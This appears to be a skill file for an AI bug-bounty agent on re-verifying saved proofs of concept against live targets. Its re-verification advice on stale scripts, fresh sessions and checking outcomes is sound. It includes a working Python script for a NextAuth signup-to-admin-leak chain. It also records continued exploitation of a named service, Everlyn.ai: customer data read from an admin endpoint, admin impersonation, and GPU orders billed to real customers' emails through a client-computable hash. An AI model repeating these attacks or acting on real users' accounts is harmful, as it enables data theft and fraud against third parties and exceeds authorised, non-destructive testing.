---
name: poc-reverification
description: "re-verify saved PoCs against the live target before building on them (stale indicators, old cookies, patched chains)"
---

# PoC Re-Verification — Saved Scripts Go Stale

Targets get patched between sessions. A PoC that worked when written may partially or fully stop reproducing hours/days later. **Re-verify against the live target before building on old findings.**

## Trigger

Use this skill any time you are about to:
- Continue work from a saved `/*-poc/` directory or old `REPORT.md`
- Quote a previous session's severity claim (CRITICAL/HIGH) in a new report
- Spawn agents that depend on an old exploit chain still working
- Tell the the operator a previously confirmed vuln is "still open"

## Rule

Before trusting any saved PoC / report / claim:

1. Run a **minimal live repro** — the actual exploit vector, end-to-end, in a fresh session (new cookies, fresh CSRF token, unique account).
2. If live behavior differs from the old script output, **trust the live test**. Scripts often assert on stale indicators, cached state, or intermediate status codes, not on the outcome the exploit actually needs.
3. Update/downgrade the finding severity to what's reproducible **today**. A partial patch means the report distinguishes "still-vulnerable class" (e.g. open signup) from "patched escalation chain" (e.g. signup → auto-login → admin RSC leak).

## Symptom Pattern (Everlyn.ai, 2026-07-29)

- Old `admin_bypass_poc.sh` printed a full **"CRITICAL / PoC COMPLETE"** summary — its assertions matched tolerant grep checks, and a leftover background process re-ran the script later, re-printing the same summary and making it look like the chain still worked.
- Live re-test showed: `signup → 201` still succeeds, but `POST /api/auth/callback/credentials` now returns **302 → `/auth/signin?error=MissingCSRF`**, session stays `null`, and `/admin` returns a generic page with no leaked stats.
- Meaning: the open-signup class is alive, but the **auto-login → admin RSC leak chain was patched** (NextAuth CSRF now strictly validated). The CRITICAL privilege-escalation claim no longer reproduces.

Lesson: a stale script saying "PoC COMPLETE" is not evidence of a live vuln. Only a fresh end-to-end run against the live target is.

## Minimal Live Re-Pro Template (NextAuth signup + credentials-login)

```python
import requests, random, string, re
S = requests.Session(); S.headers['User-Agent']='Mozilla/5.0'
B = 'https://TARGET'

S.get(B + '/api/auth/signin', timeout=30)
csrf = S.cookies.get('__Host-authjs.csrf-token','').split('|')[0]

e = 'audit' + ''.join(random.choice(string.ascii_lowercase+string.digits) for _ in range(8)) + '@gmail.com'
p = 'Test123456!'

print('signup', S.post(B+'/api/auth/signup',
    json={'email':e,'password':p,'name':'Audit'}, timeout=30).status_code)

r = S.post(B+'/api/auth/callback/credentials',
    data={'csrfToken':csrf,'email':e,'password':p,'redirect':'false'},
    timeout=30, allow_redirects=False)
print('login', r.status_code, r.headers.get('Location',''))

s = S.get(B+'/api/auth/session', timeout=30)
print('session', s.status_code, s.text[:120])

a = S.get(B+'/admin', timeout=40)
print('admin', a.status_code, 'has_stats', bool(re.search(r'known-stat-marker', a.text)),
      'snippet', a.text[:130].replace('\n',' '))
```

**Success criteria (all three):**
- `login` → `302` with `Location: /` (or app home), **not** `?error=MissingCSRF` / `?error=CredentialsSignin`
- `/api/auth/session` → JSON with a `user` object (not `null`)
- `/admin` HTML contains known leaked-stat markers (e.g. user count, revenue string), not a NEXT_REDIRECT or generic shell

## Symptom Pattern (Everlyn.ai, 2026-08-13 — SHA-512 Bypass Still Works)

Unlike the NextAuth CSRF chain which was patched, the Everlyn GPU order bypass (`POST /order` with `user_hash=SHA-512(email)`) **remained fully exploitable** 2+ weeks after initial report. The SHA-512 hash is not a secret — it is computed client-side in the frontend JavaScript.

Key re-verification findings:
- `/api/admin/orders` still returns 200 with customer data (format changed from JSON to HTML/Next.js RSC, but data still embedded)
- Admin impersonation still works: create order as `admin@everlyn.ai` → accepted
- Victim impersonation still works: take any email from the admin leak → create GPU order billed to them
- `credits_to_lock=0`, `need_watermark=false`, `user_limit=999` all still accepted
- GPU orders may never render for unregistered users (queue never processes), but order acceptance is the proof

Lesson: When a target uses a **client-computable hash** as their only auth, the bypass is structural — not a config bug that gets patched easily. Expect it to survive across multiple re-tests.

## Pitfalls

- **Cookie/JAR memory** — scripts may reuse a session file from before the patch. Use a fresh `requests.Session()` (or `curl -c /dev/null`) per repro.
- **Assertion memory** — scripts print "PoC COMPLETE" based on greps that still match generic markers (status 201 on signup, presence of `/admin` URL in HTML). Assert on **outcomes**: admin stats visible, session user set, real token bytes returned.
- **Redirect memory** — NextAuth failures return 302 to `?error=...` which is invisible if you don't print `Location`. Always surface the redirect target before concluding a login vector works.
- **One-shot false "fixed"** — a single failure could be a transient WAF block / bad CSRF. Retry once from a clean session before downgrading the finding.
- **One-shot false "still vulnerable"** — a single success could be a cache hit or an unrelated 200. Confirm the actual impact marker, not just a 200.
- **Background script revival** — a leftover background process restarting an old script can make a dead vector look alive (it re-prints the success banner without re-testing the chain). Kill leftover `proc_*` runs before re-assessing.
- **API format changes** — `/api/admin/orders` changed from JSON to HTML (Next.js RSC) between reports. Always `curl -sI` first to check Content-Type before parsing. If HTML, use `grep -oP` instead of `jq`/`python3 -m json.tool`.
- **Windows users** — `head`, `grep`, `python3` don't exist in PowerShell. Provide `curl.exe`, `Select-String`, `python` equivalents.

## Related

- `bug-bounty-agent` umbrella — overall methodology, phase gates
- `references/csrf-hardened-nextauth-pivot.md` — what to do when a saved NextAuth PoC is broken by CSRF hardening
- `references/nextauth-admin-takeover.md` (bug-bounty-agent) — the Everlyn chain this lesson came from
- `references/verification-and-poc.md` (bug-bounty-agent) — general PoC quality bar
